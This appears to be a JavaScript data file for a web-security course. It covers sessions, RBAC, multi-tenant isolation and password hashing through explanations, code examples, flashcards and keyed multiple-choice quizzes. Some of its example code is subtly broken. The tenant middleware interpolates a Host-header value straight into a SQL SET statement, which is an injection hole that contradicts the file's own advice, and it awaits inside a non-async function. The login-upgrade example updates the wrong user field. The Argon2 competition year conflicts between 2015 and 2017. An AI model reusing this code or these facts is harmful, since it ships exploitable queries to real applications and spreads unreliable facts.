    m('What does session regeneration prevent?', ['CSRF', 'Session fixation', 'XSS', 'Brute force'], 1, 'Regenerating session ID on login prevents session fixation attacks.'),
    m('What does httpOnly cookie prevent?', ['CSRF', 'XSS token theft', 'Man-in-the-middle', 'Brute force'], 1, 'httpOnly prevents JavaScript access, protecting against XSS-based session theft.'),
    m('How do you revoke a session?', ['Wait for expiry', 'Delete from store', 'Change password', 'Clear cookies'], 1, 'Delete the session from the store for immediate revocation.'),
    m('What cookie attribute prevents CSRF?', ['httpOnly', 'SameSite', 'Secure', 'Domain'], 1, 'SameSite=Lax or SameSite=Strict prevents CSRF by limiting cross-site cookie sending.'),
    m('What is rolling session expiration?', ['Session never expires', 'Reset timer on each request', 'Fixed expiry time', 'Expires after first request'], 1, 'Rolling expiration resets the idle timer with each request, keeping active sessions alive.')
  ]
);

/* =================== TOPIC 8: RBAC =================== */
addTopic('auth-rbac', 'RBAC (Role-Based Access Control)', 'intermediate', 25,
  ['RBAC is an authorization model where permissions are assigned to roles, and users are assigned to roles.',
   'Instead of assigning permissions directly to each user, you define roles (Admin, Manager, Employee) and grant permissions to those roles.',
   'RBAC simplifies management at scale: changing a role\'s permissions updates all users with that role.',
   'Key concepts: role hierarchy (senior roles inherit junior permissions), separation of duties, and least privilege.'
  ],
  'RBAC is like a company badge system. Instead of programming each employee\'s door access individually, you create badges for roles: "Employee" opens the front door, "Manager" also opens the supply closet, "Admin" opens every door. New hires get an "Employee" badge — you don\'t reprogram doors for each person.',
  [
    d('Core RBAC Concepts', 'Users: individual accounts. Roles: job functions (Admin, Editor, Viewer). Permissions: actions on resources (create:post, edit:post, delete:post). Assignments: user <-> role (many-to-many), role <-> permission (many-to-many). A user\'s effective permissions = union of all their roles\' permissions.'),
    d('Role Hierarchy', 'Admin inherits all permissions from Manager. Manager inherits from Employee. Employee has base permissions. Hierarchy reduces duplication — common permissions at lower levels, additive at higher levels. Implement as parent_role_id self-reference in roles table.'),
    d('Static vs Dynamic Separation of Duties', 'Static: a user cannot be assigned conflicting roles simultaneously (e.g., Procurement and Approver). Dynamic: a user can have both roles but cannot act as both in the same transaction. Prevents fraud by requiring two people for sensitive operations.'),
    d('RBAC Implementation Patterns', 'Database schema: users, roles, permissions, user_roles, role_permissions tables. Enforcement: middleware checks roles on routes. Service layer checks permissions. Frontend: hide/show UI elements based on user roles.'),
    d('RBAC vs ABAC', 'RBAC: simple, coarse-grained, role explosion at scale. ABAC: flexible, fine-grained, complex policy engine. RBAC is sufficient for most applications. Consider ABAC when you need attribute-based rules (time, location, resource properties).')
  ],
  'RBAC is the most practical authorization model for most applications. Define roles based on job functions. Use role hierarchy to reduce duplication. Enforce at both API and service layers. Avoid role explosion by designing roles thoughtfully — combine with ABAC if needed for complex rules.',
  [
    q('What is RBAC?', 'Role-Based Access Control — permissions are assigned to roles, and users are assigned to roles.'),
    q('What are the core RBAC components?', 'Users, Roles, Permissions, and the many-to-many relationships between them (user_roles, role_permissions).'),
    q('What is role hierarchy?', 'Senior roles inherit permissions from junior roles. Admin inherits from Manager, Manager inherits from Employee.'),
    q('What is separation of duties?', 'Preventing a single user from having conflicting roles (e.g., creating and approving purchase orders).'),
    q('What is the difference between RBAC and ABAC?', 'RBAC uses roles; ABAC uses attributes (user, resource, environment). RBAC is simpler; ABAC is more flexible.'),
    q('What is role explosion?', 'Too many roles created to handle edge cases, making management complex. Avoid by using attributes or ABAC for exceptions.'),
    q('How is RBAC enforced in web apps?', 'Middleware checks route access by role. Service layer validates permissions for business logic.'),
    q('What is the principle of least privilege in RBAC?', 'Assign only the minimum roles necessary for a user to perform their job functions.'),
    q('Can a user have multiple roles?', 'Yes. Effective permissions are the union of all assigned roles.'),
    q('How do you handle temporary elevated access?', 'Time-bound role assignments (just-in-time access). Audit logs for elevation events.')
  ],
  R(10,35,110,25,'#0070f3','','Users','Individual accounts') +
  A(120,48,150,48) +
  R(160,35,130,25,'#28a745','','Roles','Admin, Manager, Employee') +
  A(160,60,160,80) +
  R(10,70,110,25,'#ffc107','','Permissions','CRUD actions') +
  A(120,83,150,83) +
  R(160,70,130,25,'#e83e8c','','Role Hierarchy','Inherit permissions') +
  R(10,105,110,25,'#dc3545','','User_Roles','Many-to-many') +
  R(10,140,110,25,'#6610f2','','Role_Perms','Many-to-many') +
  R(300,35,180,135,'#17a2b8','','RBAC','Role-Based Access Control: users <-> roles <-> permissions. Hierarchy, separation of duties.') +
  T(240,210,'RBAC: Users are assigned roles; roles have permissions. Clean, scalable authorization model.',9,'#666','middle'),
  [
    e('RBAC Database Schema (PostgreSQL)', 'Tables for RBAC.', codeBlock([
      'CREATE TABLE users (',
      '  id SERIAL PRIMARY KEY,',
      '  name VARCHAR(100) NOT NULL',
      ');',
      '',
      'CREATE TABLE roles (',
      '  id SERIAL PRIMARY KEY,',
      '  name VARCHAR(50) UNIQUE NOT NULL,',
      '  parent_role_id INT REFERENCES roles(id) -- hierarchy',
      ');',
      '',
      'CREATE TABLE permissions (',
      '  id SERIAL PRIMARY KEY,',
      '  resource VARCHAR(50) NOT NULL,',
      "  action VARCHAR(20) NOT NULL, -- create, read, update, delete",
      '  UNIQUE(resource, action)',
      ');',
      '',
      'CREATE TABLE user_roles (',
      '  user_id INT REFERENCES users(id),',
      '  role_id INT REFERENCES roles(id),',
      '  PRIMARY KEY (user_id, role_id)',
      ');',
      '',
      'CREATE TABLE role_permissions (',
      '  role_id INT REFERENCES roles(id),',
      '  permission_id INT REFERENCES permissions(id),',
      '  PRIMARY KEY (role_id, permission_id)',
      ');'
    ]), 'Complete RBAC database schema with role hierarchy support.'),
    e('RBAC Middleware (Express)', 'Route protection by role.', codeBlock([
      "const requireRole = (...roles) => {",
      '  return async (req, res, next) => {',
      '    const userRoles = await db.query(',
      '      "SELECT r.name FROM user_roles ur',
      '       JOIN roles r ON r.id = ur.role_id',
      '       WHERE ur.user_id = $1",',
      '      [req.user.id]',
      '    );',
      '',
      '    const hasRole = userRoles.rows.some(',
      '      r => roles.includes(r.name)',
      '    );',
      '',
      '    if (!hasRole) {',
      '      return res.status(403).json({',
      '        error: \'Insufficient role\'',
      '      });',
      '    }',
      '',
      '    next();',
      '  };',
      '};',
      '',
      "app.delete('/api/posts/:id',",
      "  authenticate, requireRole('admin'),",
      '  postController.delete',
      ');'
    ]), 'RBAC middleware checks user roles against required roles for route access.'),
    e('Permission Check with Hierarchy', 'Resolve inherited permissions.', codeBlock([
      'async function getEffectivePermissions(userId) {',
      '  // Recursive CTE to resolve role hierarchy',
      '  const result = await db.query(',
      '    `WITH RECURSIVE role_tree AS (',
      '      SELECT id, parent_role_id FROM roles',
      '      WHERE id IN (',
      '        SELECT role_id FROM user_roles WHERE user_id = $1',
      '      )',
      '      UNION ALL',
      '      SELECT r.id, r.parent_role_id',
      '      FROM roles r',
      '      JOIN role_tree rt ON rt.parent_role_id = r.id',
      '    )',
      '    SELECT DISTINCT p.resource, p.action',
      '    FROM role_permissions rp',
      '    JOIN permissions p ON p.id = rp.permission_id',
      '    WHERE rp.role_id IN (SELECT id FROM role_tree)`',
      '    , [userId]',
      '  );',
      '  return result.rows;',
      '}'
    ]), 'Recursive query resolves inherited permissions through role hierarchy.'),
    e('Seed Roles and Permissions', 'Initial RBAC setup.', codeBlock([
      "INSERT INTO roles (name, parent_role_id) VALUES",
      "  ('admin', NULL),",
      "  ('manager', 1),  -- admin is parent of manager",
      "  ('employee', 2); -- manager is parent of employee",
      '',
      "INSERT INTO permissions (resource, action) VALUES",
      "  ('post', 'create'),",
      "  ('post', 'read'),",
      "  ('post', 'update'),",
      "  ('post', 'delete'),",
      "  ('user', 'read'),",
      "  ('user', 'manage');",
      '',
      "-- Employee: basic post access",
      "INSERT INTO role_permissions (role_id, permission_id)",
      "SELECT 3, id FROM permissions WHERE resource = 'post'",
      "  AND action IN ('create', 'read');",
      '',
      "-- Manager: can update posts, read users",
      "INSERT INTO role_permissions (role_id, permission_id)",
      "SELECT 2, id FROM permissions",
      "  WHERE (resource = 'post' AND action = 'update')",
      "     OR (resource = 'user' AND action = 'read');",
      '',
      "-- Admin: full access (inherits all below + delete + manage)",
      "INSERT INTO role_permissions (role_id, permission_id)",
      "SELECT 1, id FROM permissions",
      "  WHERE action IN ('delete', 'manage');"
    ]), 'Seed data for roles, permissions, and role-permission assignments.'),
    e('Frontend Role-Based UI', 'Conditional rendering by role.', codeBlock([
      '// React example: Permission-based rendering',
      'const PERMISSIONS = {',
      "  'create:post': ['admin', 'manager', 'employee'],",
      "  'update:post': ['admin', 'manager'],",
      "  'delete:post': ['admin'],",
      "  'manage:users': ['admin']",
      '};',
      '',
      'function can(permission, userRoles) {',
      '  const allowedRoles = PERMISSIONS[permission];',
      '  return allowedRoles?.some(',
      '    r => userRoles.includes(r)',
      '  ) ?? false;',
      '}',
      '',
      'function PostActions({ post, userRoles }) {',
      '  return (',
      '    <div>',
      '      {can(\'update:post\', userRoles) &&',
      '        <button>Edit</button>',
      '      }',
      '      {can(\'delete:post\', userRoles) &&',
      '        <button>Delete</button>',
      '      }',
      '    </div>',
      '  );',
      '}'
    ]), 'Frontend role checking for conditional UI rendering (always enforce on backend too).')
  ],
  [
    m('What does RBAC stand for?', ['Resource-Based Access Control', 'Role-Based Access Control', 'Rule-Based Application Control', 'Role-Bound Access Control'], 1, 'RBAC = Role-Based Access Control.'),
    m('What is the benefit of RBAC over per-user permissions?', ['Faster performance', 'Simplifies management at scale', 'More secure', 'Easier to debug'], 1, 'RBAC simplifies permission management by assigning permissions to roles, not individual users.'),
    m('What is role hierarchy?', ['Roles with same permissions', 'Senior roles inherit junior permissions', 'Roles in alphabetical order', 'Temporary role elevation'], 1, 'Role hierarchy allows senior roles to inherit permissions from junior roles.'),
    m('What problem does separation of duties solve?', ['Performance', 'Fraud prevention', 'Password security', 'Scalability'], 1, 'Separation of duties prevents fraud by requiring multiple people for sensitive operations.'),
    m('What is role explosion?', ['Too many permissions', 'Too many roles making management hard', 'Too many users', 'Deleted roles'], 1, 'Role explosion occurs when too many roles are created for edge cases.'),
    m('When should you use ABAC instead of RBAC?', ['Simple apps', 'When rules depend on attributes', 'Small teams', 'Static permissions'], 1, 'Use ABAC when access decisions depend on dynamic attributes like time, location, or resource properties.')
  ]
);

/* =================== TOPIC 9: Multi Tenant Security =================== */
addTopic('auth-multi-tenant', 'Multi Tenant Security', 'advanced', 30,
  ['Multi-tenant architecture serves multiple customers (tenants) from a single application instance, with strict data isolation.',
   'Security challenges: tenant A must never access tenant B\'s data. Isolation failures are catastrophic data breaches.',
   'Three isolation models: separate DB per tenant (strongest), separate schema per tenant, shared DB with tenant_id column (most common).',
   'Key mechanisms: tenant identification middleware, row-level security (RLS), tenant-scoped queries, cross-tenant attack prevention.'
  ],
  'Multi-tenant is like an apartment building. Each tenant (company) has their own locked unit (data). The building manager (app) must ensure Tenant A cannot enter Tenant B\'s apartment. Some buildings give each tenant a separate house (separate DB), others just lock the doors (tenant_id column).',
  [
    d('Isolation Models', 'Separate Database: each tenant gets their own DB. Strongest isolation, easiest to backup/restore per tenant. Most expensive. Separate Schema: each tenant gets their own schema in shared DB. Moderate isolation. Shared Table: all tenants share tables with tenant_id column. Most cost-effective, requires careful query scoping.'),
    d('Tenant Identification', 'Middleware extracts tenant from: subdomain (tenant1.myapp.com), custom domain (tenant1.com), header (X-Tenant-ID), JWT claim, or path prefix. Must be determined before any database operation. Store tenant context in request scope (AsyncLocalStorage).'),
    d('Row-Level Security (RLS)', 'PostgreSQL RLS automatically filters rows based on tenant_id. Enable RLS on shared tables. Create policy: USING (tenant_id = current_setting(\'app.tenant_id\')). RLS acts as a safety net — even if a query forgets the tenant filter, RLS enforces it.'),
    d('Cross-Tenant Attack Vectors', 'IDOR (Insecure Direct Object Reference): changing tenant_id in request. SQL injection to modify WHERE clauses. API enumeration: iterating tenant IDs. Data leakage in shared caches. Prevention: always scope queries, never trust client-provided tenant IDs, use RLS as defense in depth.'),
    d('Tenant Data Migration and Backup', 'Separate DB: standard backup/restore per DB. Shared DB: backup includes all tenants — restoration requires careful scoping. Migrations: run per tenant (separate schema) or once (shared table). Compliance: some regulations require physical data separation (separate DB).')
  ],
  'Multi-tenant security is about data isolation. Choose the isolation model based on compliance needs and cost. Always use tenant-scoped queries. Implement RLS as a safety net. Never trust client-provided tenant IDs — derive from authentication context. Test cross-tenant access scenarios thoroughly.',
  [
    q('What is multi-tenancy?', 'A single application instance serving multiple customers (tenants) with data isolation.'),
    q('What are the three isolation models?', 'Separate DB (strongest), separate schema (moderate), shared table with tenant_id (most common).'),
    q('What is the most common multi-tenant approach?', 'Shared database with tenant_id column in every table — cost-effective with good isolation.'),
    q('What is Row-Level Security (RLS)?', 'PostgreSQL feature that automatically filters rows based on a policy — acts as a safety net for tenant isolation.'),
    q('What is IDOR in multi-tenant context?', 'Insecure Direct Object Reference — attacker changes tenant_id in request to access another tenant\'s data.'),
    q('How do you identify the tenant?', 'Via subdomain, custom domain, header, JWT claim, or path prefix. Extract in middleware before DB operations.'),
    q('Why never trust client-provided tenant ID?', 'Attackers can modify it to access other tenants. Derive tenant ID from the authenticated user\'s session/token.'),
    q('What is AsyncLocalStorage used for?', 'To propagate tenant context across async operations without passing it explicitly through every function call.'),
    q('Which isolation model is best for compliance?', 'Separate database per tenant — provides physical data separation required by some regulations.'),
    q('How do you test multi-tenant security?', 'Write integration tests that verify Tenant A cannot access Tenant B\'s data through any API endpoint.')
  ],
  R(10,35,110,25,'#0070f3','','Tenant A','Company ABC') +
  R(10,65,110,25,'#28a745','','Tenant B','Company XYZ') +
  R(10,95,110,25,'#ffc107','','Isolation','tenant_id RLS') +
  R(10,125,110,25,'#dc3545','','Attack','IDOR, injection') +
  A(120,48,150,48) + A(120,78,150,78) + A(120,108,150,108) + A(120,138,150,138) +
  R(160,35,140,130,'#17a2b8','','Shared App','Tenant-scoped queries, RLS, separate DB optional, cross-tenant prevention.') +
  T(240,210,'Multi Tenant Security: Isolate tenant data via tenant_id, RLS, and defense in depth.',9,'#666','middle'),
  [
    e('Tenant Identification Middleware', 'Extract tenant from request.', codeBlock([
      "// Extract tenant from subdomain or header",
      "app.use((req, res, next) => {",
      '  // Option 1: subdomain (tenant1.myapp.com)',
      '  const host = req.headers.host;',
      '  const parts = host.split(\'.\');',
      '  req.tenantId = parts[0] !== \'www\'',
      '    ? parts[0]',
      '    : parts[1];',
      '',
      '  // Option 2: custom header',
      "  // req.tenantId = req.headers['x-tenant-id'];",
      '',
      '  // Option 3: from JWT claim',
      '  // req.tenantId = req.user.tenantId;',
      '',
      "  if (!req.tenantId) {",
      '    return res.status(400).json({',
      '      error: \'Tenant not identified\'',
      '    });',
      '  }',
      '',
      '  // Set for RLS',
      '  await db.query(',
      "    `SET app.tenant_id = '${req.tenantId}'`",
      '  );',
      '',
      '  next();',
      '});'
    ]), 'Middleware extracts tenant ID from request context and sets it for RLS.'),
    e('RLS Policies for Multi-Tenant (PostgreSQL)', 'Automatic tenant isolation.', codeBlock([
      '-- Enable RLS on shared tables',
      'ALTER TABLE orders ENABLE ROW LEVEL SECURITY;',
      'ALTER TABLE products ENABLE ROW LEVEL SECURITY;',
      'ALTER TABLE customers ENABLE ROW LEVEL SECURITY;',
      '',
      '-- Policy: restrict access to current tenant',
      'CREATE POLICY tenant_isolation ON orders',
      "USING (tenant_id = current_setting('app.tenant_id')::INT);",
      '',
      'CREATE POLICY tenant_isolation ON products',
      "USING (tenant_id = current_setting('app.tenant_id')::INT);",
      '',
      '-- For INSERT: enforce tenant_id',
      'CREATE POLICY tenant_insert ON orders',
      "FOR INSERT WITH CHECK (tenant_id = current_setting('app.tenant_id')::INT);",
      '',
      '-- Test: even without WHERE clause, RLS filters',
      'SELECT * FROM orders; -- only current tenant rows'
    ]), 'Row-Level Security policies enforce tenant isolation at the database level.'),
    e('Tenant-Scoped Queries', 'Always filter by tenant.', codeBlock([
      'class TenantService {',
      '  async getOrders(tenantId) {',
      '    // Always filter by tenant_id',
      '    // Even with RLS, scope explicitly',
      '    return await db.query(',
      '      "SELECT * FROM orders WHERE tenant_id = $1',
      '       ORDER BY created_at DESC",',
      '      [tenantId]',
      '    );',
      '  }',
      '',
      '  async createOrder(tenantId, data) {',
      '    return await db.query(',
      '      "INSERT INTO orders (tenant_id, ...)',
      '       VALUES ($1, ...) RETURNING *",',
      '      [tenantId, ...]',
      '    );',
      '  }',
      '}'
    ]), 'Service layer always scopes queries by tenant_id — defense in depth with RLS.'),
    e('Separate Schema per Tenant', 'Schema-based isolation.', codeBlock([
      '-- Create schema for each tenant',
      "CREATE SCHEMA IF NOT EXISTS tenant_123;",
      '',
      '-- Create tables in tenant schema',
      "CREATE TABLE tenant_123.orders (",
      '  id SERIAL PRIMARY KEY,',
      '  ... -- no tenant_id needed',
      ');',
      '',
      '-- Set search_path for tenant',
      "SET search_path TO tenant_123, public;",
      '',
      '-- Now queries automatically use tenant schema',
      'SELECT * FROM orders; -- tenant_123.orders',
      '',
      '// Node.js: switch schema per request',
      'await db.query(`SET search_path TO tenant_${tenantId}, public`);'
    ]), 'Schema-per-tenant isolation with PostgreSQL schemas and search_path.'),
    e('Cross-Tenant Attack Prevention (IDOR)', 'Validate ownership.', codeBlock([
      "app.get('/api/orders/:id', authenticate, async (req, res) => {",
      '  const order = await db.query(',
      '    "SELECT * FROM orders WHERE id = $1 AND tenant_id = $2",',
      '    [req.params.id, req.tenantId]',
      '  );',
      '',
      '  if (!order.rows[0]) {',
      '    // Return 404, not 403 — don\'t reveal existence',
      '    return res.status(404).json({',
      '      error: \'Order not found\'',
      '    });',
      '  }',
      '',
      '  res.json(order.rows[0]);',
      '});'
    ]), 'Always validate tenant ownership in queries — never trust client-provided resource IDs.'),
    e('AsyncLocalStorage for Tenant Context', 'Propagate tenant across async operations.', codeBlock([
      'const { AsyncLocalStorage } = require(\'async_hooks\');',
      'const tenantStorage = new AsyncLocalStorage();',
      '',
      "// Middleware: create async context",
      "app.use((req, res, next) => {",
      '  tenantStorage.run({ tenantId: req.tenantId }, () => {',
      '    next();',
      '  });',
      '});',
      '',
      '// Anywhere in the code:',
      'function getCurrentTenant() {',
      '  const store = tenantStorage.getStore();',
      '  return store?.tenantId;',
      '}',
      '',
      '// Service layer (no req parameter needed)',
      'async function getOrders() {',
      '  const tenantId = getCurrentTenant();',
      '  return db.query(',
      '    "SELECT * FROM orders WHERE tenant_id = $1",',
      '    [tenantId]',
      '  );',
      '}'
    ]), 'AsyncLocalStorage propagates tenant context without passing req through every call.')
  ],
  [
    m('What is the strongest multi-tenant isolation model?', ['Shared table', 'Separate schema', 'Separate database', 'Encrypted columns'], 2, 'Separate database per tenant provides the strongest isolation with physical data separation.'),
    m('What is Row-Level Security (RLS)?', ['Column encryption', 'Automatic row filtering by policy', 'Row-level backups', 'Index optimization'], 1, 'RLS automatically restricts row access based on a policy — ideal for tenant isolation.'),
    m('How should you identify the tenant?', ['From user input', 'From authentication context', 'From URL params', 'From request body'], 1, 'Tenant should be derived from the authenticated user/session context, never from user input.'),
    m('What is an IDOR vulnerability?', ['SQL injection', 'Insecure Direct Object Reference', 'Cross-site scripting', 'Denial of service'], 1, 'IDOR occurs when an attacker can access resources by changing IDs in requests.'),
    m('Why should you return 404 instead of 403 for cross-tenant access?', ['Faster response', 'Don\'t reveal resource existence', 'Easier to implement', 'Better for SEO'], 1, 'Returning 404 prevents attackers from discovering valid resource IDs.'),
    m('What tool propagates tenant context in Node.js?', ['Global variables', 'AsyncLocalStorage', 'process.env', 'Session'], 1, 'AsyncLocalStorage (async_hooks) propagates context across async operations without passing parameters.')
  ]
);

/* =================== TOPIC 10: Password Hashing =================== */
addTopic('auth-password-hashing', 'Password Hashing', 'intermediate', 25,
  ['Password hashing converts a plaintext password into an irreversible hash using a one-way cryptographic function.',
   'Key properties: one-way (cannot reverse), deterministic (same input = same hash), slow (computationally expensive to resist brute force).',
   'Salting: adding a unique random value to each password before hashing. Prevents rainbow table attacks and identical-password detection.',
   'Modern algorithms: bcrypt, Argon2 (winner of 2015 Password Hashing Competition), scrypt, PBKDF2. Argon2id is the current gold standard.'
  ],
  'Password hashing is like a recipe that turns eggs into an omelet. You can make an omelet from eggs, but you cannot turn an omelet back into eggs. Salting is like adding a secret spice unique to each omelet — even if two people use the same eggs, their omelets taste different.',
  [
    d('What Makes a Good Hash Algorithm?', 'Slow: tunable work factor (cost). Memory-hard: Argon2 uses significant memory, making GPU/ASIC attacks expensive. Salted: unique per password. Constant-time comparison: prevents timing attacks. Avoid: MD5, SHA-1, SHA-256 (too fast — billions of hashes per second on GPU).'),
    d('Salting Explained', 'Salt: cryptographically random string, at least 16 bytes. Stored alongside the hash (not secret). Unique per password. Purpose: two users with same password get different hashes. Prevents precomputed rainbow tables. Makes cracking one password no help for others.'),
    d('bcrypt', 'Based on Blowfish cipher. Adaptive: cost factor (2^cost iterations) can be increased as hardware improves. Output: $2b$10$[22-char salt][31-char hash]. Cost 10-12 recommended. Built-in salt generation. Max password length: 72 bytes. Most widely used, well-audited.'),
    d('Argon2 (Modern Standard)', 'Winner of the 2017 Password Hashing Competition. Argon2id: hybrid mode (side-channel + GPU resistant). Parameters: memory cost (64MB+), time cost (3+), parallelism (2+). Output: $argon2id$v=19$m=65536,t=3,p=2$[salt]$[hash]. Not yet as universally available as bcrypt.'),
    d('PBKDF2 and scrypt', 'PBKDF2: older standard (NIST), used in many legacy systems. Configured with iteration count and hash function (SHA-256). Vulnerable to GPU/ASIC attacks. scrypt: memory-hard (like Argon2 predecessor). Consumes configurable memory to resist hardware attacks. Default in many crypto wallets.')
  ],
  'Use Argon2id if available in your language/framework. Use bcrypt as a widely-supported fallback. Always use a unique salt per password. Set work factor high enough that each attempt takes ~100ms. Never implement your own hashing algorithm. Never use MD5, SHA-1, or unsalted SHA-256 for passwords.',
  [
    q('What is password hashing?', 'Converting a password into an irreversible hash using a one-way cryptographic function, protecting it even if the database is breached.'),
    q('What is a salt?', 'A unique random value added to each password before hashing. Prevents rainbow table attacks and identical-password detection.'),
    q('What are the three properties of a good hash algorithm?', 'Slow (tunable work factor), memory-hard (resist GPU/ASIC), and salted (unique per password).'),
    q('Why is SHA-256 bad for passwords?', 'It is designed to be fast — billions of hashes per second on GPUs. Attackers can brute force passwords quickly.'),
    q('What is the current gold standard for password hashing?', 'Argon2id — winner of the 2015 Password Hashing Competition. Memory-hard, resistant to GPU and side-channel attacks.'),
    q('What is bcrypt\'s maximum password length?', '72 bytes. Passwords longer than 72 bytes are truncated. Pre-hash very long passwords if needed.'),
    q('What does the bcrypt cost factor do?', 'Controls the computational cost: 2^cost iterations. Each increment doubles the work. Cost 10-12 is standard.'),
    q('What is a pepper?', 'A secret, application-wide value added to passwords before hashing (like a salt but kept secret). Adds an extra layer of security. Optional.'),
    q('What is constant-time comparison?', 'Comparing hashes in a way that takes the same time regardless of how many characters match. Prevents timing attacks.'),
    q('What does "one-way" mean?', 'Given the hash, it is computationally infeasible to determine the original password. The only way is guessing and checking.')
  ],
  R(10,35,130,25,'#0070f3','','Password','Plaintext input') +
  A(140,48,170,48) +
  R(180,35,110,25,'#28a745','','Salt','Unique random value') +
  A(290,48,310,48) +
  R(320,35,150,25,'#ffc107','','Hash Function','bcrypt / Argon2id') +
  A(320,60,320,80) +
  R(10,70,110,25,'#dc3545','','Stored Hash','$2b$10$salt.hash') +
  R(10,100,110,25,'#e83e8c','','Database','hash + salt') +
  R(10,130,110,25,'#6610f2','','Verify','hash(input+salt) == stored') +
  R(10,160,110,25,'#17a2b8','','Attack','Cannot reverse hash') +
  R(320,70,140,115,'#17a2b8','','Password Hashing','One-way, salted, slow. Argon2id > bcrypt > PBKDF2. Never MD5/SHA.') +
  T(240,220,'Password Hashing: One-way transformation with salt. Prevent reverse engineering of user passwords.',9,'#666','middle'),
  [
    e('Argon2id Hashing (Node.js)', 'Modern password hashing.', codeBlock([
      'const argon2 = require(\'argon2\');',
      '',
      '// Hashing',
      'async function hashPassword(password) {',
      '  try {',
      '    const hash = await argon2.hash(password, {',
      '      type: argon2.argon2id,',
      '      memoryCost: 65536, // 64 MB',
      '      timeCost: 3,       // 3 iterations',
      '      parallelism: 2     // 2 threads',
      '    });',
      '    return hash;',
      '    // Output: $argon2id$v=19$m=65536,t=3,p=2$...',
      '  } catch (err) {',
      '    throw new Error(\'Hashing failed\');',
      '  }',
      '}',
      '',
      '// Verification',
      'async function verifyPassword(hash, password) {',
      '  try {',
      '    return await argon2.verify(hash, password);',
      '  } catch (err) {',
      '    return false;',
      '  }',
      '}'
    ]), 'Argon2id password hashing — the current gold standard, memory-hard and resistant to GPU attacks.'),
    e('Salting Explained with Code', 'Why each password needs unique salt.', codeBlock([
      'const crypto = require(\'crypto\');',
      '',
      '// BAD: no salt (unsalted SHA-256)',
      'function badHash(password) {',
      '  return crypto.createHash(\'sha256\')',
      '    .update(password).digest(\'hex\');',
      '}',
      '// badHash("password123") is always the same',
      '// Rainbow table instantly reverses it',
      '',
      '// GOOD: unique salt per password',
      'function goodHash(password) {',
      '  const salt = crypto.randomBytes(16).toString(\'hex\');',
      '  const hash = crypto.pbkdf2Sync(',
      '    password, salt, 100000, 32, \'sha256\'',
      "  ).toString('hex');",
      '  return salt + \':\' + hash; // store both',
      '}',
      '// Same password produces different hash',
      '// Attacker must crack each hash individually'
    ]), 'Salt ensures identical passwords produce different hashes, preventing rainbow table attacks.'),
    e('PBKDF2 with High Iterations', 'Legacy but widely compatible.', codeBlock([
      'const crypto = require(\'crypto\');',
      '',
      'function hashPasswordPBKDF2(password) {',
      '  const salt = crypto.randomBytes(16).toString(\'hex\');',
      '  const iterations = 600000; // OWASP 2023 recommendation',
      '',
      '  const hash = crypto.pbkdf2Sync(',
      '    password, salt, iterations, 32, \'sha512\'',
      "  ).toString('hex');",
      '',
      '  return `${iterations}:${salt}:${hash}`;',
      '}',
      '',
      'function verifyPBKDF2(stored, password) {',
      '  const [iterations, salt, hash] = stored.split(\':\');',
      '  const verify = crypto.pbkdf2Sync(',
      '    password, salt, parseInt(iterations), 32, \'sha512\'',
      "  ).toString('hex');",
      '  return crypto.timingSafeEqual(',
      '    Buffer.from(hash),',
      '    Buffer.from(verify)',
      '  );',
      '}'
    ]), 'PBKDF2 with high iteration count — use timing-safe comparison to prevent timing attacks.'),
    e('Password Upgrade on Login', 'Transition to stronger algorithm.', codeBlock([
      'async function loginAndUpgrade(email, password) {',
      '  const user = await db.query(',
      '    "SELECT * FROM users WHERE email = $1", [email]',
      '  );',
      '  if (!user.rows[0]) return null;',
      '',
      '  const { password_hash, hash_algorithm } = user.rows[0];',
      '  let valid = false;',
      '',
      '  if (hash_algorithm === \'argon2id\') {',
      '    valid = await argon2.verify(password_hash, password);',
      '  } else if (hash_algorithm === \'bcrypt\') {',
      '    valid = await bcrypt.compare(password, password_hash);',
      '    if (valid) {',
      '      // Upgrade to Argon2 on successful login',
      '      const newHash = await argon2.hash(password);',
      '      await db.query(',
      '        "UPDATE users SET password_hash = $1,',
      '         hash_algorithm = \'argon2id\' WHERE id = $2",',
      '        [newHash, user.id]',
      '      );',
      '    }',
      '  }',
      '',
      '  return valid ? user : null;',
      '}'
    ]), 'Upgrade password hashes on successful login — transition users to stronger algorithms transparently.'),
    e('Password Strength Validation', 'Enforce strong passwords.', codeBlock([
      'function validatePasswordStrength(password) {',
      '  const errors = [];',
      '',
      '  if (password.length < 12) {',
      '    errors.push(\'At least 12 characters\');',
      '  }',
      '  if (!/[A-Z]/.test(password)) {',
      '    errors.push(\'At least one uppercase letter\');',
      '  }',
      '  if (!/[a-z]/.test(password)) {',
      '    errors.push(\'At least one lowercase letter\');',
      '  }',
      '  if (!/[0-9]/.test(password)) {',
      '    errors.push(\'At least one number\');',
      '  }',
      '  if (!/[^A-Za-z0-9]/.test(password)) {',
      '    errors.push(\'At least one special character\');',
      '  }',
      '  // Check against common passwords',
      '  const common = [\'password\', \'123456\', \'qwerty\'];',
      '  if (common.some(w => password.toLowerCase().includes(w))) {',
      '    errors.push(\'Avoid common passwords\');',
      '  }',
      '',
      '  return {',
      '    valid: errors.length === 0,',
      '    errors',
      '  };',
      '}'
    ]), 'Password strength validation before hashing — enforce minimum security requirements.')
  ],
  [
    m('Why should passwords be hashed?', ['Save storage space', 'Irreversible — protects if DB breached', 'Faster authentication', 'Compatibility'], 1, 'Hashing makes passwords irreversible, protecting them even if the database is compromised.'),
    m('What does a salt do?', ['Encrypts the hash', 'Makes identical passwords produce different hashes', 'Compresses the output', 'Adds pepper'], 1, 'Salt ensures unique hashes per password, preventing rainbow table and identical-password attacks.'),
    m('Which algorithm is the current gold standard?', ['bcrypt', 'Argon2id', 'PBKDF2', 'scrypt'], 1, 'Argon2id is the current gold standard — winner of the 2017 Password Hashing Competition.'),
    m('Why is SHA-256 unsuitable for passwords?', ['It\'s broken', 'Too fast — billions of hashes per second on GPU', 'Output is too short', 'Requires a key'], 1, 'SHA-256 is designed for speed, making brute-force attacks too efficient.'),
    m('What is the recommended bcrypt cost factor?', ['4-6', '10-12', '16-18', '20+'], 1, 'Cost 10-12 provides a good balance of security and performance (~100ms per hash).'),
    m('What is constant-time comparison?', ['Faster comparison', 'Prevents timing attacks', 'Encrypted comparison', 'Multi-threaded comparison'], 1, 'Constant-time comparison prevents attackers from determining hash values through timing measurements.')
  ]
);

/* =================== TOPIC 11: bcrypt =================== */
addTopic('auth-bcrypt', 'bcrypt', 'beginner', 15,
  ['bcrypt is a password hashing function based on the Blowfish cipher. It is the most widely used password hashing algorithm in web applications.',
   'Key features: built-in salt generation, adaptive cost factor, well-audited and battle-tested since 1999.',
   'Output format: $2b$10$[22-character salt][31-character hash] — the cost factor is embedded in the output.',
